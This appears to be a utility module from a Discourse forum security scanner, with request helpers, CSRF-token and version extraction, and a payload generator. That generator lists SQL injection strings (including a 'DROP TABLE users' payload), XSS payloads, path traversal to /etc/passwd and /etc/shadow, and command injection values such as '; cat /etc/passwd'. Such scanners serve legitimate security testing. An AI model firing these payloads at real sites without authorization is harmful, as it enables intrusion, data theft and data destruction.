#!/usr/bin/env python3
"""
Discourse Security Scanner - Utility Functions

General purpose utility and helper functions
"""

import re
import requests
import urllib.parse
from colorama import Fore, Style
from bs4 import BeautifulSoup
import time
import random
import json
from .user_agents import user_agents

def validate_url(url):
    """Validate URL format"""
    url_pattern = re.compile(
        r'^https?://'  # http:// or https://
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+'  # domain
        r'(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'  # host
        r'localhost|'  # localhost
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'  # IP
        r'(?::\d+)?'  # port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    
    return bool(url_pattern.match(url))

def normalize_url(url):
    """Normalize URL"""
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    # Remove trailing slash
    url = url.rstrip('/')
    
    return url

def make_request(url, method='GET', headers=None, data=None, params=None, 
                timeout=10, verify_ssl=True, proxies=None, allow_redirects=True,
                cookies=None):
    """Send HTTP request"""
    try:
        default_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        if headers:
            default_headers.update(headers)
        
        response = requests.request(
            method=method,
            url=url,
            headers=default_headers,
            data=data,
            params=params,
            timeout=timeout,
            verify=verify_ssl,
            proxies=proxies,
            allow_redirects=allow_redirects,
            cookies=cookies
        )
        
        return response
        
    except requests.exceptions.RequestException as e:
        return None

def extract_csrf_token(html_content):
    """Extract CSRF token from HTML content"""
    try:
        soup = BeautifulSoup(html_content, 'html.parser')
        
        # Search for CSRF token in meta tag
        csrf_meta = soup.find('meta', {'name': 'csrf-token'})
        if csrf_meta:
            return csrf_meta.get('content')
        
        # Search for CSRF token in form input
        csrf_input = soup.find('input', {'name': 'authenticity_token'})
        if csrf_input:
            return csrf_input.get('value')
        
        # Discourse specific CSRF token
        csrf_input = soup.find('input', {'name': 'csrf_token'})
        if csrf_input:
            return csrf_input.get('value')
        
        return None
        
    except Exception:
        return None

def extract_discourse_version(html_content):
    """Extract Discourse version from HTML content"""
    try:
        soup = BeautifulSoup(html_content, 'html.parser')
        
        # Check meta generator tag
        generator = soup.find('meta', {'name': 'generator'})
        if generator and 'discourse' in generator.get('content', '').lower():
            content = generator.get('content')
            version_match = re.search(r'discourse[\s-]+(\d+\.\d+\.\d+)', content, re.IGNORECASE)
            if version_match:
                return version_match.group(1)
        
        # Check JavaScript for version
        scripts = soup.find_all('script')
        for script in scripts:
            if script.string and 'Discourse.VERSION' in script.string:
                # Use a simple regex pattern
                pattern = r'Discourse\.VERSION\s*=\s*["\']([0-9.]+)["\']'
                version_match = re.search(pattern, script.string)
                if version_match:
                    return version_match.group(1)
        
        return None
        
    except Exception:
        return None

def generate_payloads(payload_type):
    """Generate different types of payloads"""
    payloads = {
        'sql_injection': [
            "'",
            "''",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "' UNION SELECT NULL--",
            "' UNION SELECT 1,2,3--",
            "1' AND (SELECT COUNT(*) FROM users) > 0--",
            "1' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
            "'; DROP TABLE users; --",
            "1' WAITFOR DELAY '00:00:05'--",
            "1'; SELECT SLEEP(5)--"
        ],
        'xss': [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>"
        ],
        'path_traversal': [
            "../",
            "../..",
            "../../..",
            "../../../..",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "../../../../etc/passwd",
            "../../../../etc/shadow",
            "../../../../etc/hosts",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd"
        ],
        'command_injection': [
            "; ls -la",
            "| ls -la",
            "&& ls -la",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "&& cat /etc/passwd",
            "; whoami",
            "| whoami",
            "&& whoami",
            "`whoami`",
            "$(whoami)"
        ]
    }
    
    return payloads.get(payload_type, [])

def random_user_agent():
    """Return random User-Agent"""
    return random.choice(user_agents).strip()

def format_time(seconds):
    """Convert seconds to readable format"""
    if seconds < 60:
        return f"{seconds:.1f} seconds"
    elif seconds < 3600:
        minutes = seconds // 60
        secs = seconds % 60
        return f"{int(minutes)} minutes {int(secs)} seconds"
    else:
        hours = seconds // 3600
        minutes = (seconds % 3600) // 60
        return f"{int(hours)} hours {int(minutes)} minutes"

def print_progress(current, total, prefix='', suffix='', length=50):
    """Show progress bar"""
    percent = (current / total) * 100
    filled_length = int(length * current // total)
    bar = '█' * filled_length + '-' * (length - filled_length)
    
    print(f'\r{prefix} |{bar}| {percent:.1f}% {suffix}', end='', flush=True)
    
    if current == total:
        print()  # New line

def save_json(data, filename):
    """Save data to JSON file"""
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        return True
    except Exception:
        return False

def load_json(filename):
    """Load data from JSON file"""
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            return json.load(f)
    except Exception:
        return None

def is_discourse_site(url, timeout=10):
    """Check if site is Discourse"""
    try:
        response = make_request(url, timeout=timeout)
        if not response:
            return False
        
        # Check HTML content
        html = response.text.lower()
        
        # Discourse indicators
        discourse_indicators = [
            'discourse',
            'data-discourse',
            'discourse-application',
            'discourse-cdn',
            '/assets/discourse',
            'discourse.js',
            'discourse-presence'
        ]
        
        for indicator in discourse_indicators:
            if indicator in html:
                return True
        
        # Header check
        headers = response.headers
        if 'discourse' in str(headers).lower():
            return True
        
        return False
        
    except Exception:
        return False

def clean_url(url):
    """Clean and normalize URL"""
    # Add protocol
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    # Parse URL
    parsed = urllib.parse.urlparse(url)
    
    # Create clean URL
    clean = f"{parsed.scheme}://{parsed.netloc}"
    
    return clean
